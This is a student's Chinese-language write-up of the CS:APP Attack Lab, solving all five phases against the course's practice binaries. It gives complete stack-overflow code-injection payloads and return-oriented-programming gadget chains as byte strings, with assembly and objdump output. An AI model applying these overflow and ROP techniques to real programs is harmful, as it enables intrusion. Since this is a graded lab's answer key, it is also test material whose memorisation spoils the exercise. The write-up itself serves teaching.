# Attacklab

做到这个lab才发现有writeup。

## Part I: Code Injection Attacks

通过注入恶意代码攻击CTARGET

### phase_1

目标是通过注入实现调用touch1函数。

先用objdump -d把汇编代码搞出来，查看getbuf和test函数开了多大的栈空间。我这里的getbuf开的是0x28，那就构造一个40个字节的输入数据先填满它，再构造一个8字节的数据覆盖test函数在栈里的位置，程序就会执行那8个字节指向位置的代码了。

这里要我们执行touch1函数，在汇编代码里查看其对应字节是00000000004017c0，注意要改成小端法表示，加到那40个字节后面即可。

随后`./hex2raw -i touch1.txt | ./ctarget -q`即完成phase_1。

### phase_2

目标是通过注入代码实现调用touch2并把参数设置成自己的cookie(我的cookie是0x59b997fa）。

注入的代码中不能含有call和jmp指令，因此要调用touch2函数，只好先将touch2函数的地址压入栈中，随后借助ret指令执行。

因此要注入的代码如下

```c
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```

如何注入？首先将上述代码保存为touch2.s，通过gcc touch2.s -c 命令将其编译但不链接，生成touch2.o文件。随后通过objdump touch2.o -d 即可得到上述汇编代码对应的字节码

```shell
root@YJMSTR-Alienware17:/mnt/c/csapp/attacklab/target1# objdump -d touch2.o

touch2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

我们要的是`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`.

随后根据上述数据构造48字节的输入数据，前40个字节包含我们的攻击代码，最后8个字节覆盖原先栈中的返回地址，使其指向我们注入的代码的起始地址。

可以在gdb中通过单步调试和layout reg获取%rsp的值，用于计算我们注入的代码的起始地址。在getbuf函数打个断点，当程序运行到这个断点时，%rsp的值为 0x5561dca0，再单步执行一步，把它减去0x28，即为我们输入的字节码存放的起始地址0x5561dc78 。由于x86-64的linux系统是小端法表示，需要将其写成78 dc 61 55 00 00 00 00.

最终我们的输入文件touch2.txt中的内容如下

```assembly
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```

执行命令`./hex2raw -i touch2.txt | ./ctarget -q `，即完成phase_2.

### phase_3

writeup中给出了hexmatch函数和touch3函数的c代码，其中hexmatch函数比较unsigned类型的一个参数和char* 指向的字符串的16进制表示是否相同。而touch3在调用hexmatch来比较cookie和传入的字符串参数sval。

我们的目标是通过注入代码调用touch3并将cookie作为字符串形式的参数传入。

我的cookie是0x59b997fa，按照writeup中的要求应写为8个从高位到低位排序的16进制数（不含前导0x），即对应的字节码为`35 39 62 39 39 37 66 61`。而c语言中字符串以'\0'结尾，因此在上述字节码的结尾还需要加入一个`00`，最终cookie对应的字符串参数的字节码为`35 39 62 39 39 37 66 61 00`.

注意到`When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
portions of memory that held the buffer used by getbuf. ` 我们用getbuf()的栈帧就不太合适了，考虑把字符串存在更高的位置，使用test()的栈帧。将字符串作为参数传递时，寄存器中存放的是字符串的地址，此处我们使用了test栈帧中的地址。

getbuf被调用后的栈长这样

```assembly
test对应的栈帧 {
	
	返回地址{}
}
getbuf的栈帧 {
	输入的字节码（从下往上存）{}
}
```

返回地址中要存放我们输入的字节码对应的起始地址，%rdi要被设置为字符串的存放地址，由于上述原因，字符串存放在test对应栈帧中比较安全，因此我们在填充完返回地址后加上字符串对应的字节码，字符串对应的存放地址即为getbuf调用前一条指令时rsp指向的地址，在本机是0x5561dca8。

与phase_2类似，要注入的代码如下

```
movq	$0x5561dca8, %rdi
pushq	$0x4018fa
ret
```

objdump -d 得

```assembly
root@YJMSTR-Alienware17:/mnt/c/csapp/attacklab/target1# objdump touch3.o -d

touch3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

对应的字节码是`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00` ,将其保存为touch3.txt，输入`./hex2raw -i touch3.txt | ./ctarget -q`即通过phase_3.

## Part II: Return-Oriented Programming

RTARGET使用了栈随机化，并将栈在内存中所占部分标记为不可执行，这使得在CTARGET中使用的攻击方法不适用于RTARGET。本部分需要我们使用程序中已有的指令进行攻击。

`The strategy with ROP is to identify byte sequences within an existing program
that consist of one or more instructions followed by the instruction ret.Such a segment is referred to as a gadget.`

意思是，一段以ret指令结尾的代码被称为gadget。我们可以将栈中的返回地址用若干个gadget的地址覆盖，这样这些gadget的代码就会被依次执行，通过恰当的gadget组合，能够实现我们的攻击。

我们的目标是在提供给我们的gadget farm中找出有用的gadget来实现phase_2和phase_3中的攻击。

### phase_4

要求：通过gadget构建包含以下指令的解答：movq，popq，ret，nop。并且只能用x86-64的前八个寄存器

原先我们要注入的代码如下

```assembly
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```

由于cookie没有出现在代码中，我们只好先将cookie注入到栈中，再通过popq指令将其存放至寄存器中。

那么需要执行的指令如下：

```assembly
popq	%rax
ret
movq	%rax, %rdi
ret
```

栈长这样

```c
test{
    touch2
    gadget2(movq %rax, %rdi)的地址
    cookie
    返回地址{
        gadget1(popq %rax)的地址
    }
}
getbuf{
    填满0x28个字节
}
```

构造的输入数据就是0x28个字节+gadget1 + cookie + gadget2

去gadget farm中找找popq %rax和movq %rax, %rdi对应的gadget，查writeup末尾的表知popq %rax 对应的字节是58，我们找58 c3对应的指令的地址就行。

但找了一圈还是没找到，只能换个寄存器试试或者找找有没有中间跟着90的指令（对应的是nop）

在汇编代码中找到了

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

58 90 c3 正好是我们要的，因此gadget1对应的地址是`0x4019ab`.由于是小端法表示，要写成`ab 19 40 00 00 00 00 00`

接下来要把cookie写入栈中，因此后面接的是 `fa 97 b9 59 00 00 00 00 `。

然后找movq  %rax, %rdi，查表知对应的字节码是48 89 c7，同理找一个含有49 89 c7的或是有多余nop的地址就行。这里我找的是

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```

对应的字节码是`c5 19 40 00 00 00 00 00 `

最后还要让程序执行touch2，因此还需要加上字节码`ec 17 40 00 00 00 00 00 `

最终要注入的字节是`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00`

###  phase_5

和phase_4类似，但这里是要先把字符串存进栈中，再把字符串的地址作为参数传给touch3

因此我们要构建一个长这样的栈

```c
test{
    字符串
    touch3
    gedget2{movq %rax %rdi}
    字符串的地址
    gedget1{popq %rax}
}
getbuf{
    0x28个字节
}
```

由于栈随机化，我们不能直接把字符串的地址存进去，得用相对地址（用栈顶地址算出字符串的地址），一个思路是将栈顶地址存入某个寄存器，字符串地址和栈顶地址的差存入另外一个寄存器，利用lea计算字符串地址。

在gadget farm找到一个名为add_xy的函数如下

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq  
```

整个函数可以直接用，取4019d6

围绕这个函数可以如下构造 

```c
test {
    字符串
    gadget...
    字符串地址和栈顶的差值x
    gadget...
}
getbuf{
    注入数据				
}
```

要把栈顶地址存进寄存器来计算，即找movq %rsp, %r..  对应字节`48 89 e_`

只找到了这个比较合适

```assembly
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   
```

取401a06,即`mov %rsp, %rax`

然后要把rax中的值弄到rdi或者rsi中去

找movq %rax, %rdi，即搜索`48 89 c7`，找到以下函数

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```

取4019c5

然后要把x出栈存入寄存器 即找popq %r__  ,  然后movq %r__, %rsi 或者直接popq %rsi

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

这里找到的是4019ab，`58 90 c3`，即`popq %rax`，但movq %rax, %rsi对应的字节码`48 89 c6`没找到，可能中间还要再用其它寄存器中转一下，或者是用movl而不是movq

找mov ax对应的`89 c_`，

找的过程中发现一个函数

```assembly
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   
```

401a13处实现了movl %ecx, %esi，我们可以从这里入手找通过ecx中转相关的指令

找的过程中又发现一个gadget

```assembly
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   
```

4019dd实现了movl %eax, %edx

那如果有movq %rdx, %rcx (48 89 d1)或者movl %edx, %ecx(89 d1)， 我们就能完成把偏差值传入%rsi的任务了。

找到了以下代码

```assembly
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq    
```

89 d1背后的08 db是writeup的附表D中提到的functional nop，不会影响gadget的功能 可以直接无视。

因此我们可以通过401a69实现`movl %edx, %ecx`

组织一下我们找到的代码对应的字节码

1. 先取401a06,即`mov %rsp, %rax`

2. 取4019c5  即`mov %rax, %rdi`

3. 取4019ab 即`popq %rax`
4. 偏移量对应字节

5. 4019dd, `movl %eax, %edx`

6. 401a69  `movl %edx, %ecx`

7. 401a13 `movl %ecx, %esi`

8. 4019d6 `lea (%rdi,%rsi,1),%rax`

这些gadget实现了将rdi和rsi分别置为栈顶和偏差值，随后可以通过lea计算出字符串所在的地址

最后将地址作为参数传给touch3并调用touch3即可完成phase5

9. 4019a2 `movq %rax, %rdi`

10. 4018fa touch3
11. 字符串的地址

从上述流程不难看出栈顶和字符串地址差了9条指令，72个字节，即偏移量为0x48，答案的字节序列如下

```assembly
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

保存为phase5.txt  ，执行`./hex2raw -i phase5.txt | ./rtarget -q`，完成











 







